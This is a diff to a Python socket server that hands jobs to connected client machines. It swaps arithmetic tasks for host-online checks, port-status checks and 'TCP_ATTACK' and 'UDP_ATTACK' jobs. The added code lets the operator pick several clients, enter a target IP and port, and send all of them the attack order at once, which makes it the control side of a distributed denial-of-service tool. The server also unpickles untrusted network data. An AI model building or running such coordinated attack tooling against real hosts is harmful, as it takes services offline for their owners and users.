@@ -18,7 +18,7 @@ connectedJS = []     #keep track of all connected jobseekers(socket object)
 allAddress = []      #keep track of ip address of all job seekers
 
 signal = ['JOB_SENT']
-jobs = ['ADD','SUBSTRACT','MULTIPLY','DIVIDE']
+jobs = ['IS_HOST_ONLINE','PORT_STATUS','TCP_ATTACK','UDP_ATTACK']
 
 
 def acceptConnections():
@@ -40,6 +40,7 @@ def sendJobs():
             if len(connectedJS)<=0: #initially there will not be any connection so we cannot proceed further
                time.sleep(2)
                continue
+
             while True:
                 print('Available Job seekers are:')
                 index = 0
@@ -63,26 +64,58 @@ def sendJobs():
             for i in range(0,n):#actual job seeker numbers will be stored in list selectedJS
                 selectedJS.append(int(input()))
 
-            for i in range(0,n):#sending jobs to all job seekers in list
-                print(f'<CLIENT {i+1}>')
+            if(len(selectedJS)>1):
+                print("What job you want job seeker to perform \n3.TCP_ATTACK \n 4.UDP_ATTACK" )
+                jobNumber=int(input())-1
+                print('Please Enter IP:')
+                IP = input()
+                print('Please Enter PortNumber:')
+                Port = input()
+                for i in range(0,n):#sending jobs to all job seekers in list
+                    print(f'<CLIENT {i+1}>')
+                    msgRecieved = connectedJS[selectedJS[i]-1].recv(1024)
+                    data = pickle.loads(msgRecieved)
+                    print('****JOB REQUEST FROM CLIENT****')
+                    print(data)
+                    print('\n')
+                    processReqMulti(data,selectedJS[i],jobNumber,IP,Port)#assigning job to job seeker
+            else :
                 msgRecieved = connectedJS[selectedJS[i]-1].recv(1024)
                 data = pickle.loads(msgRecieved)
-                print('****JOB REQUEST FROM CLIENT****')
-                print(data)
-                print('\n')
-                processReq(data,selectedJS[i])#assigning random job to job seeker
+                print("What job you want job seeker to perform \n 1. IS_HOST_ONLINE \n 2. PORT_STATUS")
+                jobNumber=int(input())-1
+                processReq(data,selectedJS[i],jobNumber)#assigning job to job seeker
 
             for i in range(0,n):#closing and deleting connection to which job is sent.
                 selectedJS[i] = selectedJS[i] - i;
                 del connectedJS[selectedJS[i]-1]
                 del allAddress[selectedJS[i]-1]
 
-def processReq(data,selectedJS):#assigning random job to job seeker
+def processReq(data,selectedJS,jobNumber):#assigning random job to job seeker
     header = data.jobHeader
     if header == 'ASK':
-        seed(time.time())
-        x = ServerData(signal[0],jobs[randint(0, 3)],[randint(0, 20000),randint(1, 20000)])
-        x.msgSize = sys.getsizeof(pickle.dumps(x));
+        print('Please Enter IP:')
+        IP = input()
+        if(jobNumber == 0):
+            x = ServerData(signal[0],jobs[jobNumber],[IP])
+        else:
+            print('Please Enter PortNumber:')
+            Port = input()
+            x = ServerData(signal[0],jobs[jobNumber],[IP,Port])
+
+        x.msgSize = sys.getsizeof(pickle.dumps(x))
+        connectedJS[selectedJS-1].send(pickle.dumps(x))
+        result = pickle.loads(connectedJS[selectedJS-1].recv(1024))
+        print('****RESULT FROM CLIENT****')
+        print(result)
+        print('\n')
+        connectedJS[selectedJS-1].close()
+
+def processReqMulti(data,selectedJS,jobNumber,IP,Port):#assigning random job to job seeker
+    header = data.jobHeader
+    if header == 'ASK':
+        x = ServerData(signal[0],jobs[jobNumber],[IP,Port])
+        x.msgSize = sys.getsizeof(pickle.dumps(x))
         connectedJS[selectedJS-1].send(pickle.dumps(x))
         result = pickle.loads(connectedJS[selectedJS-1].recv(1024))
         print('****RESULT FROM CLIENT****')
